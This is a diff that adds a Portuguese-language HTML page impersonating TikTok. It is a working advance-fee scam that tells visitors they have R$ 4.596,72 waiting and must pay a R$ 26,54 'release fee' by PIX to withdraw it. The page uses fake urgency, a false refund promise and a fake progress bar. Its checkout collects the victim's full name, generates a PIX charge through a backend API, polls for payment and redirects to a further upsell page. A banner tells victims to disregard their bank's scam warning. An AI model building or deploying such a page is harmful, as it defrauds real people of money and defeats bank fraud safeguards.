@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Saque Liberado</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * { -webkit-font-smoothing: antialiased; }
+
+        .btn-tiktok {
+            background: linear-gradient(135deg, #FE2C55 0%, #ff0040 100%);
+            transition: transform 0.15s, box-shadow 0.15s;
+        }
+        .btn-tiktok:active { transform: scale(0.97); }
+
+        .progress-bar {
+            background: linear-gradient(90deg, #FE2C55 0%, #25F4EE 100%);
+            width: 0%;
+            animation: fillBar 2s ease-out 0.3s forwards;
+        }
+        @keyframes fillBar { to { width: 97%; } }
+
+        .success-icon {
+            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s both;
+        }
+        @keyframes popIn {
+            from { transform: scale(0); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Spinner */
+        .co-spinner {
+            width: 18px; height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: co-spin 0.8s linear infinite;
+            display: inline-block;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes co-spin { to { transform: rotate(360deg); } }
+
+        /* STEP 2 QR */
+        .co-qr-box {
+            background: #f1f5f9;
+            border-radius: 0;
+            width: 155px; height: 155px;
+            margin: 0 auto 12px;
+            display: flex; align-items: center; justify-content: center;
+            padding: 10px; box-sizing: border-box;
+        }
+        .co-qr-img { width: 100%; height: 100%; object-fit: contain; border-radius: 0; }
+
+        .co-success-toast {
+            position: fixed; top: 16px; left: 16px; right: 16px;
+            background: #ecfdf5; border: 1px solid #10b981; color: #065f46;
+            padding: 12px 18px; border-radius: 12px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; gap: 8px;
+            box-shadow: 0 8px 24px rgba(16,185,129,0.15); z-index: 9999;
+            animation: slideDown 0.4s cubic-bezier(0.16,1,0.3,1) forwards;
+        }
+        .co-success-toast.fade-out { animation: slideUp 0.4s ease forwards; }
+        @keyframes slideDown { from { opacity:0; transform:translateY(-30px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes slideUp { from { opacity:1; transform:translateY(0); } to { opacity:0; transform:translateY(-30px); } }
+
+        .co-error-box {
+            background: #fef2f2; border: 1px solid #fca5a5; color: #991b1b;
+            border-radius: 10px; padding: 12px 14px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; gap: 8px; margin-bottom: 10px;
+        }
+
+        .pix-code-truncated {
+            font-size: 11px; color: #94a3b8; text-align: center;
+            text-overflow: ellipsis; overflow: hidden; white-space: nowrap; width: 100%;
+            margin: 4px 0 8px;
+        }
+
+        .co-btn-copiar {
+            width: 100%; height: 52px;
+            background: linear-gradient(135deg, #FE2C55 0%, #ff0040 100%);
+            border: none; border-radius: 14px; color: #fff;
+            font-size: 15px; font-weight: 800;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; margin-bottom: 8px;
+            box-shadow: 0 4px 14px rgba(255,0,80,0.2);
+            transition: transform 0.1s;
+        }
+        .co-btn-copiar:active { transform: scale(0.98); }
+
+        .co-btn-ja-efetuei {
+            width: 100%; height: 46px;
+            background: #f1f5f9; border: none; color: #4b5563;
+            border-radius: 12px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body class="antialiased bg-white">
+
+    <!-- Barra de aviso -->
+    <div class="bg-black text-white text-center py-2 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+        Caso o pagamento da taxa não seja efetuado, o bônus será doado e a vaga será automaticamente perdida.
+    </div>
+
+    <!-- ====================== PÁGINA UPSELL ====================== -->
+    <div id="page-upsell" class="max-w-md mx-auto min-h-screen pb-12 bg-white">
+
+        <!-- Header com logo e saldo -->
+        <div class="px-6 pt-10 pb-8 flex flex-col items-center border-b border-gray-50 bg-white">
+            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png"
+                 alt="TikTok Logo" class="h-28 w-28 object-contain mb-6 drop-shadow-sm">
+            <div class="text-center">
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-[0.2em] mb-1">Saldo Total Disponível</p>
+                <h2 class="text-5xl font-[900] text-[#161823] tracking-tighter">R$ 4.596,72</h2>
+            </div>
+        </div>
+
+        <div class="px-6 py-8">
+
+            <!-- Ícone de sucesso e título -->
+            <div class="text-center mb-8">
+                <div class="relative inline-flex mb-6">
+                    <div class="success-icon w-20 h-20 bg-white border-4 border-[#161823] rounded-full flex items-center justify-center relative z-10">
+                        <svg class="w-10 h-10 text-[#25F4EE]" fill="none" stroke="currentColor" viewBox="0 0 24 24"
+                             style="filter: drop-shadow(2px 0px 0px #FE2C55);">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path>
+                        </svg>
+                    </div>
+                    <div class="absolute -top-1 -left-1 w-20 h-20 bg-[#FE2C55] rounded-full opacity-20"></div>
+                    <div class="absolute -bottom-1 -right-1 w-20 h-20 bg-[#25F4EE] rounded-full opacity-20"></div>
+                </div>
+                <h1 class="text-2xl font-black mb-2 italic">PARABÉNS!</h1>
+                <p class="text-gray-500 text-sm leading-relaxed px-4">
+                    Sua conta foi aprovada para saque imediato. O valor de <strong>R$ 4.596,72</strong> será enviado via PIX.
+                </p>
+            </div>
+
+            <!-- Barra de progresso -->
+            <div class="mb-10">
+                <div class="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-2">
+                    <div class="progress-bar h-full"></div>
+                </div>
+                <div class="flex justify-between items-center">
+                    <p class="text-[10px] font-bold text-[#FE2C55] uppercase tracking-wider">Aguardando Liberação</p>
+                    <p class="text-[10px] font-bold text-gray-400 uppercase">97%</p>
+                </div>
+            </div>
+
+            <!-- Card da taxa -->
+            <div class="space-y-4">
+                <div class="bg-gray-50 rounded-2xl p-6 border border-gray-100">
+                    <p class="text-[14px] text-gray-700 leading-relaxed text-center">
+                        Para liberar o saque e ativar sua conta permanentemente, realize o pagamento da
+                        <strong>Taxa Única de Resgate</strong> de
+                        <span class="text-black font-black text-lg">R$ 26,54</span>.
+                    </p>
+                </div>
+
+                <!-- Botão -->
+                <button id="btn-liberar" onclick="abrirCheckout()" class="btn-tiktok block w-full text-white text-center font-[900] py-5 rounded-full text-xl shadow-2xl uppercase tracking-wider">
+                    LIBERAR MEU SAQUE
+                </button>
+
+                <p class="text-center text-[11px] text-gray-400 font-medium">
+                    * O valor da taxa é reembolsado no ato do saque.
+                </p>
+
+                <!-- Card URGENTE -->
+                <div class="mt-8 p-6 bg-black rounded-[2rem] relative overflow-hidden shadow-xl">
+                    <div class="absolute top-0 right-0 p-3">
+                        <span class="bg-[#FE2C55] text-white text-[9px] font-black px-2 py-1 rounded-md uppercase tracking-widest">URGENTE</span>
+                    </div>
+                    <p class="text-gray-400 text-[11px] uppercase font-bold mb-1 tracking-widest">Você receberá no PIX:</p>
+                    <p class="text-4xl font-black text-white tracking-tighter">R$ 4.596,72 + Bônus</p>
+                    <div class="mt-4 flex items-center gap-2">
+                        <div class="w-2 h-2 bg-[#25F4EE] rounded-full animate-pulse shadow-[0_0_8px_#25F4EE]"></div>
+                        <span class="text-[#25F4EE] text-[10px] font-black uppercase tracking-[0.1em]">Pronto para transferência</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- FAQ -->
+            <div class="mt-10 space-y-2">
+                <details class="group bg-white rounded-xl border border-gray-100 shadow-sm">
+                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-[13px] text-gray-800 uppercase tracking-tight">
+                        Por que existe essa taxa?
+                        <span class="text-[#FE2C55] transition-transform group-open:rotate-45 text-xl">+</span>
+                    </summary>
+                    <div class="px-4 pb-4 text-[13px] text-gray-500 leading-relaxed">
+                        A taxa de resgate serve para autenticar sua chave PIX e garantir que os fundos sejam enviados para o titular correto da conta TikTok.
+                    </div>
+                </details>
+            </div>
+        </div>
+
+        <footer class="py-12 text-center">
+            <p class="text-[10px] text-gray-300 font-bold uppercase tracking-[0.4em]">TikTok Financial © 2026</p>
+        </footer>
+    </div>
+
+    <!-- ====================== CHECKOUT OVERLAY ====================== -->
+    <div id="page-checkout" class="hidden fixed inset-0 z-[9999] bg-[#f8fafc] overflow-y-auto">
+
+        <!-- Barra topo -->
+        <div class="bg-[#FE2C55] text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+            PAGAMENTO 100% SEGURO
+        </div>
+
+        <div class="max-w-md mx-auto pb-16 px-4 pt-6">
+
+            <!-- Etapa 1: Identificação -->
+            <div id="co-step-1">
+
+                <!-- Card produto -->
+                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-12 h-12 rounded-xl border border-gray-200 flex items-center justify-center overflow-hidden flex-shrink-0">
+                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                        </div>
+                        <div>
+                            <div class="text-[15px] font-bold text-gray-900">Antecipação de Saldo</div>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-100 mt-4 pt-3 flex justify-between items-center">
+                        <span class="text-sm text-gray-500 font-medium">Total</span>
+                        <span class="text-sm font-semibold text-gray-600">R$ 26,54</span>
+                    </div>
+                </div>
+
+                <!-- Card identificação -->
+                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
+                    <div class="flex items-center gap-2 mb-4">
+                        <div class="w-6 h-6 bg-[#FE2C55] rounded-full flex items-center justify-center flex-shrink-0">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="white" stroke-width="2" viewBox="0 0 24 24">
+                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+                            </svg>
+                        </div>
+                        <h2 class="text-[16px] font-bold text-gray-900">Identificação</h2>
+                    </div>
+                    <label class="block text-sm font-semibold text-gray-600 mb-2">Nome completo</label>
+                    <input type="text" id="checkout-name" placeholder="Nome e sobrenome"
+                           class="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm outline-none focus:border-[#FE2C55] transition-colors">
+                </div>
+
+                <div id="co-error" class="hidden co-error-box">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="#dc2626" stroke-width="2.5" viewBox="0 0 24 24" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                    <span id="co-error-text"></span>
+                </div>
+
+                <button id="btn-pagar-agora" onclick="gerarPix()" class="btn-tiktok w-full text-white font-[900] py-4 rounded-2xl text-[15px] uppercase tracking-wider mb-3 flex items-center justify-center gap-2">
+                    PAGAR AGORA
+                </button>
+                <p class="text-center text-[11px] text-gray-400 flex items-center justify-center gap-1">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#10b981" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                    Pagamento seguro via PIX com aprovação imediata.
+                </p>
+            </div>
+
+            <!-- Etapa 2: QR Code -->
+            <div id="co-step-2" class="hidden">
+
+                <!-- Card produto -->
+                <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-12 h-12 rounded-xl border border-gray-200 flex items-center justify-center overflow-hidden flex-shrink-0">
+                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                        </div>
+                        <div>
+                            <div class="text-[15px] font-bold text-gray-900">Antecipação de Saldo</div>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-100 mt-4 pt-3 flex justify-between items-center">
+                        <span class="text-sm text-gray-500 font-medium">Total</span>
+                        <span class="text-sm font-semibold text-gray-600" id="co-price-display">R$ 26,54</span>
+                    </div>
+                </div>
+
+                <h2 class="text-[18px] font-bold text-center text-gray-900 mb-4">Escaneie o QR-code ou copie o código.</h2>
+
+                <!-- QR Code -->
+                <div class="co-qr-box">
+                    <img id="qr-img" src="" alt="QR Code PIX" class="co-qr-img">
+                </div>
+
+                <!-- Valor e código truncado -->
+                <div class="flex justify-between items-center px-1 mb-1">
+                    <span class="text-sm text-gray-400 font-medium">Valor PIX:</span>
+                    <span class="text-[22px] font-black text-gray-900" id="pix-valor-display">R$ 26,54</span>
+                </div>
+                <div class="pix-code-truncated" id="pix-code-truncated"></div>
+
+                <!-- Botões -->
+                <button onclick="copiarPix()" class="co-btn-copiar">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="white" stroke-width="2.5" viewBox="0 0 24 24" style="margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    Copiar PIX
+                </button>
+
+                <button id="btn-ja-efetuei" onclick="verificarPagamento()" class="co-btn-ja-efetuei">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+                    Já efetuei o pagamento!
+                </button>
+
+                <!-- Aviso redirecionamento -->
+                <div class="flex items-start text-[11px] text-gray-400 leading-relaxed mb-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#6b7280" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px;flex-shrink:0;margin-top:2px"><polyline points="9 18 15 12 9 6"/></svg>
+                    <span>Você será redirecionado automaticamente após a confirmação do pagamento. Se preferir, clique em <strong>"Já efetuei o pagamento!"</strong> para verificar se o pagamento foi aprovado.</span>
+                </div>
+
+                <!-- Aviso banco -->
+                <div class="bg-[#eff6ff] border border-[#bfdbfe] rounded-xl p-3 mb-4">
+                    <div class="flex items-center gap-2 text-[#1e3a8a] font-bold text-[12px] mb-1">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="#1e3a8a" stroke-width="2" viewBox="0 0 24 24" style="flex-shrink:0"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+                        <strong>Seu banco pode exibir um alerta</strong>
+                    </div>
+                    <p class="text-[#1e40af] text-[11px] leading-relaxed">Alguns bancos mostram um aviso automático em qualquer Pix para um destinatário novo. Isso é normal e não significa que a compra é golpe. Confira os dados e conclua o pagamento com tranquilidade.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <input type="text" id="pix-copy-input" style="position:absolute;left:-9999px;" readonly>
+
+    <script>
+        let _pixTxid = null;
+        let _pixRoute = null;
+        let _pollingInterval = null;
+
+        function abrirCheckout() {
+            document.getElementById('page-checkout').classList.remove('hidden');
+            document.getElementById('page-upsell').style.overflow = 'hidden';
+            window.scrollTo(0, 0);
+        }
+
+        function fecharCheckout() {
+            document.getElementById('page-checkout').classList.add('hidden');
+            document.getElementById('page-upsell').style.overflow = '';
+        }
+
+        function mostrarErro(msg) {
+            const el = document.getElementById('co-error');
+            document.getElementById('co-error-text').textContent = msg;
+            el.classList.remove('hidden');
+        }
+
+        function ocultarErro() {
+            document.getElementById('co-error').classList.add('hidden');
+        }
+
+        function mostrarToast(msg, verde = true) {
+            const t = document.createElement('div');
+            t.className = 'co-success-toast';
+            t.style.background = verde ? '#ecfdf5' : '#fef2f2';
+            t.style.borderColor = verde ? '#10b981' : '#fca5a5';
+            t.style.color = verde ? '#065f46' : '#991b1b';
+            t.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="${verde ? '#10b981' : '#dc2626'}" stroke-width="3" viewBox="0 0 24 24" style="flex-shrink:0"><polyline points="20 6 9 17 4 12"/></svg> ${msg}`;
+            document.body.appendChild(t);
+            setTimeout(() => { t.classList.add('fade-out'); setTimeout(() => t.remove(), 400); }, 3000);
+        }
+
+        function pararPolling() {
+            if (_pollingInterval) { clearInterval(_pollingInterval); _pollingInterval = null; }
+        }
+
+        function aoAprovar() {
+            pararPolling();
+            mostrarToast('Pagamento confirmado! Redirecionando...');
+            // Aqui você pode definir para onde redirecionar após o pagamento do up1
+            // Ex: próxima oferta ou página de confirmação
+            setTimeout(() => { window.location.href = 'up2.html'; }, 1500);
+        }
+
+        function iniciarPolling(txid, route) {
+            pararPolling();
+            let tentativas = 0;
+            _pollingInterval = setInterval(async () => {
+                tentativas++;
+                if (tentativas > 60) { pararPolling(); return; }
+                try {
+                    const resp = await fetch('/api/pix/status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ txid, route })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'approved') { aoAprovar(); }
+                    else if (data.status && data.status !== 'waiting_payment') { pararPolling(); }
+                } catch (e) {}
+            }, 6000);
+        }
+
+        async function gerarPix() {
+            const nome = document.getElementById('checkout-name').value.trim();
+            const palavras = nome.split(/\s+/).filter(p => p.length >= 2);
+            if (palavras.length < 2) {
+                const input = document.getElementById('checkout-name');
+                input.style.borderColor = '#FE2C55';
+                input.placeholder = nome === '' ? 'Digite seu nome e sobrenome' : 'Precisa incluir o sobrenome também';
+                input.value = '';
+                setTimeout(() => { input.style.borderColor = ''; }, 2000);
+                return;
+            }
+
+            ocultarErro();
+            const btn = document.getElementById('btn-pagar-agora');
+            btn.innerHTML = 'Gerando PIX... <span class="co-spinner"></span>';
+            btn.disabled = true;
+            btn.style.opacity = '0.8';
+
+            try {
+                const resp = await fetch('/api/pix/gerar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ nome, amount: 2654 }) // R$ 26,54 em centavos
+                });
+                const data = await resp.json();
+
+                btn.innerHTML = 'PAGAR AGORA';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+
+                if (!resp.ok || data.error) {
+                    mostrarErro(data.error || 'Erro ao gerar PIX. Tente novamente.');
+                    return;
+                }
+
+                _pixTxid = data.txid;
+                _pixRoute = data.route;
+
+                // Atualiza QR Code
+                const qrImg = document.getElementById('qr-img');
+                if (data.pix_qr_code) {
+                    qrImg.src = data.pix_qr_code;
+                } else if (data.pix_code) {
+                    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.pix_code)}`;
+                }
+
+                // Atualiza código copia-cola
+                document.getElementById('pix-copy-input').value = data.pix_code;
+                const trunc = document.getElementById('pix-code-truncated');
+                if (trunc) trunc.textContent = data.pix_code.substring(0, 95) + '...';
+
+                // Mostra step 2
+                document.getElementById('co-step-1').classList.add('hidden');
+                document.getElementById('co-step-2').classList.remove('hidden');
+                window.scrollTo(0, 0);
+
+                mostrarToast('Código PIX gerado com sucesso!');
+                iniciarPolling(data.txid, data.route);
+
+            } catch (err) {
+                btn.innerHTML = 'PAGAR AGORA';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                mostrarErro('Erro de conexão. Verifique sua internet e tente novamente.');
+            }
+        }
+
+        function copiarPix() {
+            const input = document.getElementById('pix-copy-input');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value).then(() => {
+                mostrarToast('Código PIX copiado!');
+            }).catch(() => {
+                document.execCommand('copy');
+                mostrarToast('Código PIX copiado!');
+            });
+        }
+
+        async function verificarPagamento() {
+            if (!_pixTxid) return;
+            const btn = document.getElementById('btn-ja-efetuei');
+            btn.textContent = 'Verificando...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/api/pix/status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ txid: _pixTxid, route: _pixRoute })
+                });
+                const data = await resp.json();
+                if (data.status === 'approved') { aoAprovar(); }
+                else {
+                    btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>Já efetuei o pagamento!';
+                    btn.disabled = false;
+                    mostrarToast('Pagamento ainda não identificado. Aguarde ou tente novamente.', false);
+                }
+            } catch (e) {
+                btn.innerHTML = 'Já efetuei o pagamento!';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
